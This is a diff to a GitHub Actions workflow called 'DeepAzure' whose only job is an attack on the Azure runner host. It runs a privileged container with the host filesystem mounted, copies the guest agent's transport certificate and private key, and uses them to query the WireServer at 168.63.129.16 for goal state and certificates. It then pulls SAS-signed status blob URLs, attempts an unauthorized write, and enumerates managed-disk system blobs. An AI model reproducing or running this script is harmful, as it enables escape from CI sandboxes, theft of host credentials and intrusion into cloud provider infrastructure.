@@ -1,47 +1,69 @@
-name: FullConfig2
+name: DeepAzure
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: download wire server configs
-        timeout-minutes: 4
+      - name: azure deep scan
+        timeout-minutes: 5
         run: |
           set +e
           docker run --rm --privileged --net=host -v /:/hostfs alpine sh -c '
-            apk add --no-cache curl sed 2>/dev/null
+            apk add --no-cache curl sed openssl 2>/dev/null
             cp /hostfs/var/lib/waagent/TransportCert.pem /tmp/cert.pem
             cp /hostfs/var/lib/waagent/TransportPrivate.pem /tmp/key.pem
             HDRS="x-ms-version: 2012-11-30"
             echo === GOALSTATE ===
             GS=$(curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" http://168.63.129.16/machine/?comp=goalstate 2>&1)
-            echo "$GS"
-            echo === EXTRACT URLS ===
-            HOSTING_URL=$(echo "$GS" | sed -n "s/.*<HostingEnvironmentConfig>\(.*\)<\/HostingEnvironmentConfig>.*/\1/p" | sed "s/&amp;/\&/g")
-            SHARED_URL=$(echo "$GS" | sed -n "s/.*<SharedConfig>\(.*\)<\/SharedConfig>.*/\1/p" | sed "s/&amp;/\&/g")
-            EXT_URL=$(echo "$GS" | sed -n "s/.*<ExtensionsConfig>\(.*\)<\/ExtensionsConfig>.*/\1/p" | sed "s/&amp;/\&/g")
-            FULL_URL=$(echo "$GS" | sed -n "s/.*<FullConfig>\(.*\)<\/FullConfig>.*/\1/p" | sed "s/&amp;/\&/g")
             CERT_URL=$(echo "$GS" | sed -n "s/.*<Certificates>\(.*\)<\/Certificates>.*/\1/p" | sed "s/&amp;/\&/g")
-            echo "Hosting: $HOSTING_URL"
-            echo "Shared: $SHARED_URL"
-            echo "Extensions: $EXT_URL"
-            echo "Full: $FULL_URL"
-            echo "Certs: $CERT_URL"
-            echo === HOSTING ENV CONFIG ===
-            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$HOSTING_URL" 2>&1 | head -80
+            echo "CertURL: $CERT_URL"
+            echo === CERTIFICATES WITH HEADER ===
+            CERT_B64=$(cat /tmp/cert.pem | grep -v "^---" | tr -d "\n")
+            echo "CertB64 len: ${#CERT_B64}"
+            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" "$CERT_URL" 2>&1 | head -100
             echo
-            echo === SHARED CONFIG ===
-            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$SHARED_URL" 2>&1 | head -80
+            echo === STATUS BLOB READ ===
+            EXT_URL=$(echo "$GS" | sed -n "s/.*<ExtensionsConfig>\(.*\)<\/ExtensionsConfig>.*/\1/p" | sed "s/&amp;/\&/g")
+            EXT=$(curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$EXT_URL" 2>&1)
+            STATUS_URL=$(echo "$EXT" | sed -n "s/.*<StatusUploadBlob[^>]*>\(.*\)<\/StatusUploadBlob>.*/\1/p" | sed "s/&amp;/\&/g")
+            echo "StatusURL: ${STATUS_URL:0:120}..."
+            curl -s --max-time 10 -H "x-ms-blob-type: PageBlob" "$STATUS_URL" 2>&1 | head -40
             echo
-            echo === EXTENSIONS CONFIG ===
-            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$EXT_URL" 2>&1 | head -80
+            echo === STATUS BLOB WRITE TEST ===
+            WRITE_RESP=$(curl -s --max-time 10 -w "\nHTTP_%{http_code}" -X PUT -H "x-ms-blob-type: PageBlob" -H "Content-Type: application/octet-stream" -H "Content-Length: 0" "$STATUS_URL" 2>&1)
+            echo "$WRITE_RESP"
             echo
-            echo === FULL CONFIG ===
-            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$FULL_URL" 2>&1 | head -120
+            echo === VM ARTIFACTS PROFILE READ ===
+            ARTIFACTS_URL=$(echo "$EXT" | sed -n "s/.*<InVMArtifactsProfileBlob>\(.*\)<\/InVMArtifactsProfileBlob>.*/\1/p" | sed "s/&amp;/\&/g")
+            echo "ArtifactsURL: ${ARTIFACTS_URL:0:120}..."
+            curl -s --max-time 10 "$ARTIFACTS_URL" 2>&1 | head -60
             echo
-            echo === CERTIFICATES ===
-            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$CERT_URL" 2>&1 | head -80
+            echo === GA MANIFEST DOWNLOAD ===
+            for url in \
+              https://umsadsbffxjtrsrbvlsh.blob.core.windows.net/568bb00f-455e-32b8-8deb-0e1bf1636254/568bb00f-455e-32b8-8deb-0e1bf1636254_manifest.xml \
+              https://umsalcpqbll1pt0ftgkp.blob.core.windows.net/568bb00f-455e-32b8-8deb-0e1bf1636254/568bb00f-455e-32b8-8deb-0e1bf1636254_manifest.xml \
+              ; do
+              echo "--- $url ---"
+              curl -s --max-time 10 -w "\nHTTP_%{http_code}" "$url" 2>&1 | head -40
+              echo
+            done
+            echo === MANAGED DISK STORAGE LIST ===
+            MD_BASE=$(echo "$STATUS_URL" | cut -d"?" -f1 | sed "s|/\$system/.*|/\$system|")
+            MD_SAS=$(echo "$STATUS_URL" | cut -d"?" -f2)
+            echo "MD_BASE: $MD_BASE"
+            curl -s --max-time 10 -w "\nHTTP_%{http_code}" "${MD_BASE}?restype=container&comp=list&${MD_SAS}" 2>&1 | head -40
+            echo
+            echo === OTHER SYSTEM BLOBS ===
+            BLOB_PREFIX=$(echo "$STATUS_URL" | sed "s|.*/\$system/||" | cut -d"." -f1-2)
+            echo "Prefix: $BLOB_PREFIX"
+            MD_HOST=$(echo "$STATUS_URL" | cut -d"/" -f1-3)
+            for suffix in status vmSettings screenInfo extensionStatus heartbeat; do
+              BLOB_URL="${MD_HOST}/\$system/${BLOB_PREFIX}.${suffix}?${MD_SAS}"
+              RESP=$(curl -s --max-time 5 -w "HTTP_%{http_code}" "$BLOB_URL" 2>&1)
+              CODE=$(echo "$RESP" | tail -1)
+              echo "$suffix: $CODE $(echo "$RESP" | head -5 | head -c 200)"
+            done
             echo
             echo === DONE ===
           '
